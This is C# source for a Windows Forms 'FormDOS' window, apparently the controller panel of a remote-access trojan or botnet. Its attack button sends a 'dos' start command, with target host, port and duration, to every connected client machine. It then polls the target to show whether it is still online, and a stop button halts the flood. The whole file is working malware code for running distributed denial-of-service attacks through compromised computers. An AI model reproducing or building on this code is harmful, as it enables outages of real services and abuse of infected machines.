using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
    public partial class FormDOS : Form
    {
        public List<Clients> PlguinClients = new List<Clients>();
        public List<Clients> selectedClients = new List<Clients>();
        private string status = "is online";
        private Stopwatch stopwatch;
        public object sync = new object();
        private TimeSpan timespan;

        public FormDOS()
        {
            InitializeComponent();
        }

        private void BtnAttack_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtHost.Text) || string.IsNullOrWhiteSpace(txtPort.Text) ||
                string.IsNullOrWhiteSpace(txtTimeout.Text)) return;

            try
            {
                if (!txtHost.Text.ToLower().StartsWith("http://")) txtHost.Text = "http://" + txtHost.Text;
                new Uri(txtHost.Text);
            }
            catch
            {
                return;
            }

            if (PlguinClients.Count > 0)
                try
                {
                    btnAttack.Enabled = false;
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "dos";
                    msgpack.ForcePathObject("Option").AsString = "postStart";
                    msgpack.ForcePathObject("Host").AsString = txtHost.Text;
                    msgpack.ForcePathObject("Port").AsString = txtPort.Text;
                    msgpack.ForcePathObject("Timeout").AsString = txtTimeout.Text;

                    foreach (var clients in PlguinClients)
                    {
                        selectedClients.Add(clients);
                        ThreadPool.QueueUserWorkItem(clients.Send, msgpack.Encode2Bytes());
                    }

                    btnStop.Enabled = true;
                    timespan = TimeSpan.FromSeconds(Convert.ToInt32(txtTimeout.Text) * 60);
                    stopwatch = new Stopwatch();
                    stopwatch.Start();
                    timer1.Start();
                    timer2.Start();
                }
                catch
                {
                }
        }

        private void BtnStop_Click(object sender, EventArgs e)
        {
            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "dos";
                msgpack.ForcePathObject("Option").AsString = "postStop";

                foreach (var clients in PlguinClients)
                    ThreadPool.QueueUserWorkItem(clients.Send, msgpack.Encode2Bytes());
                selectedClients.Clear();
                btnAttack.Enabled = true;
                btnStop.Enabled = false;
                timer1.Stop();
                timer2.Stop();
                status = "is online";
            }
            catch
            {
            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            Text =
                $"DOS ATTACK:{timespan.Subtract(TimeSpan.FromSeconds(stopwatch.Elapsed.Seconds))}    Status:host {status}";
            if (timespan < stopwatch.Elapsed)
            {
                btnAttack.Enabled = true;
                btnStop.Enabled = false;
                timer1.Stop();
                timer2.Stop();
                status = "is online";
            }
        }

        private void Timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                var req = WebRequest.Create(new Uri(txtHost.Text));
                var res = req.GetResponse();
                res.Dispose();
                status = "is online";
            }
            catch
            {
                status = "is offline";
            }
        }

        private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                foreach (var clients in PlguinClients) clients.Disconnected();
                PlguinClients.Clear();
                selectedClients.Clear();
            }
            catch
            {
            }

            Hide();
            Parent = null;
            e.Cancel = true;
        }
    }
}